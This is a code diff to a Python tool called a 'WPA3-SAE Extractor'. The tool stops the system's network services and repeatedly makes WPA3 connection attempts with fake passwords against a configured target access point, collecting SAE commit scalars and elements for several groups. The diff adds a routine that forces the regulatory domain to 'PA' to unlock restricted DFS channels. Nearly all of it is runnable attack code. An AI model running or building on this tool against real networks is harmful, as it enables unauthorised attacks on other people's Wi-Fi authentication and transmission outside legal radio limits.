@@ -15,10 +15,11 @@ FEATURES:
 import os, sys, time, string, random, select, subprocess
 
 # ======================= CONFIGURATION =======================
-MANAGED_IFACE = "wlanX" # Your normal Wi-Fi interface
+MANAGED_IFACE = "wlanX" # Your normal Wi-Fi interface (Managed Mode)
 TARGET_SSID = "Your_WiFi_Name"
 TARGET_BSSID = "AA:BB:CC:DD:EE:11".lower()
 TARGET_CHANNEL = "X"    # Channel of the target network
+REGULATORY_DOMAIN = "PA"  # Sets the region (e.g., PA, DE, US)
 PAIRS_PER_GROUP = 20
 MAX_ATTEMPTS = 10       # Skip if AP doesn't support the group
 # =============================================================
@@ -26,19 +27,51 @@ MAX_ATTEMPTS = 10       # Skip if AP doesn't support the group
 SAE_GROUPS = [19, 20, 21, 22, 23, 24]
 collected = {g: {"scalars": [], "finites": []} for g in SAE_GROUPS}
 
-def clean_wpa_state():
+def channel_to_freq(channel_str):
+    """Converts a Wi-Fi channel number to its center frequency in MHz."""
+    if not channel_str: return ""
+    ch = int(channel_str)
+    # 2.4 GHz Band
+    if 1 <= ch <= 13: return str(2407 + (ch * 5))
+    if ch == 14: return "2484"
+    # 5 GHz Band
+    if 36 <= ch <= 173: return str(5000 + (ch * 5))
+    return ""
+
+def initial_dfs_bypass():
+    """Heavy hack to unlock DFS channels. Runs ONLY ONCE at startup."""
+    print("[*] Running initial DFS & Regulatory bypass (takes ~5 seconds)...")
+    os.system("systemctl stop NetworkManager 2>/dev/null")
+    os.system("airmon-ng check kill 2>/dev/null")
     os.system("killall wpa_supplicant 2>/dev/null")
     os.system(f"rm -rf /var/run/wpa_supplicant/{MANAGED_IFACE} 2>/dev/null")
     
     os.system(f"ip link set {MANAGED_IFACE} down 2>/dev/null")
-    time.sleep(0.1)
+    time.sleep(0.5)
     
-    res = subprocess.run(
-        ["iw", "dev", MANAGED_IFACE, "set", "channel", str(TARGET_CHANNEL)],
-        capture_output=True, text=True
-    )
-    
+    os.system(f"iw dev {MANAGED_IFACE} set type monitor 2>/dev/null")
+    time.sleep(0.2)
     os.system(f"ip link set {MANAGED_IFACE} up 2>/dev/null")
+    time.sleep(0.5)
+    if REGULATORY_DOMAIN:
+        os.system(f"iw reg set {REGULATORY_DOMAIN} 2>/dev/null")
+    time.sleep(0.5)
+    
+    os.system(f"ip link set {MANAGED_IFACE} down 2>/dev/null")
+    time.sleep(0.5)
+    os.system(f"iw dev {MANAGED_IFACE} set type managed 2>/dev/null")
+    time.sleep(0.2)
+    os.system(f"ip link set {MANAGED_IFACE} up 2>/dev/null")
+    time.sleep(0.5)
+    if REGULATORY_DOMAIN:
+        os.system(f"iw reg set {REGULATORY_DOMAIN} 2>/dev/null")
+    time.sleep(0.5)
+
+def clean_wpa_state():
+    """Fast cleanup between attempts. Must be blazing fast."""
+    os.system("killall wpa_supplicant 2>/dev/null")
+    os.system(f"rm -rf /var/run/wpa_supplicant/{MANAGED_IFACE} 2>/dev/null")
+    time.sleep(0.1)
 
 def main():
     if os.geteuid() != 0:
@@ -46,8 +79,14 @@ def main():
 
     print("[*] WPA3-SAE Extractor (Bulletproof Non-Blocking Mode)")
     print(f"[*] Target: {TARGET_SSID} ({TARGET_BSSID}) on Channel {TARGET_CHANNEL}")
+    print(f"[*] Hack: Automated Monitor->Managed DFS Bypass (Reg: {REGULATORY_DOMAIN})")
     print(f"[*] Mode: Immediate output per group | Pairs/Group: {PAIRS_PER_GROUP}")
-    clean_wpa_state()
+    
+    initial_dfs_bypass()
+
+    # Calculate frequency once
+    target_freq = channel_to_freq(TARGET_CHANNEL)
+    freq_line = f"    freq_list={target_freq}" if target_freq else ""
 
     for group_id in SAE_GROUPS:
         print(f"\n[*] ==========================================")
@@ -75,6 +114,7 @@ network={{
     key_mgmt=SAE
     proto=RSN
     ieee80211w=2
+{freq_line}
 }}"""
             with open("/tmp/temp_extract.conf", "w") as f:
                 f.write(conf)
@@ -87,18 +127,16 @@ network={{
             found_in_this_run = False
             start_time = time.time()
 
-            # --- BULLETPROOF NON-BLOCKING READ LOOP ---
+
             while True:
 
-                if time.time() - start_time > 8:
+                if time.time() - start_time > 15:
                     break
 
                 reads, _, _ = select.select([proc.stdout], [], [], 0.5)
 
                 if reads:
-
                     line = proc.stdout.readline()
-
                     if not line: 
                         break
 
@@ -119,7 +157,7 @@ network={{
                             collected[group_id]["scalars"].append(scalar)
                             collected[group_id]["finites"].append(finite)
                             found_in_this_run = True
-                            print(f"[+] ✅ Fast-Extract Success: Pair {len(collected[group_id]['scalars'])}/{PAIRS_PER_GROUP} extracted! (Triggered by fake PW: {password})")
+                            print(f"[+] ✅ Fast-Extract Success: Pair {len(collected[group_id]['scalars'])}/{PAIRS_PER_GROUP} extracted!")
                         break # Break the stdout-loop, we have what we need
 
             proc.terminate()
@@ -127,7 +165,6 @@ network={{
             clean_wpa_state()
 
             if found_in_this_run:
-                # Reset attempts counter if we are successfully collecting data
                 attempt = 1
             else:
                 attempt += 1
@@ -147,7 +184,9 @@ network={{
 
     if os.path.exists("/tmp/temp_extract.conf"):
         os.remove("/tmp/temp_extract.conf")
-    os.system("systemctl restart NetworkManager 2>/dev/null")
+    
+    print("\n[*] Extraction complete. Restarting NetworkManager...")
+    os.system("systemctl start NetworkManager 2>/dev/null")
 
 if __name__ == "__main__":
     main()
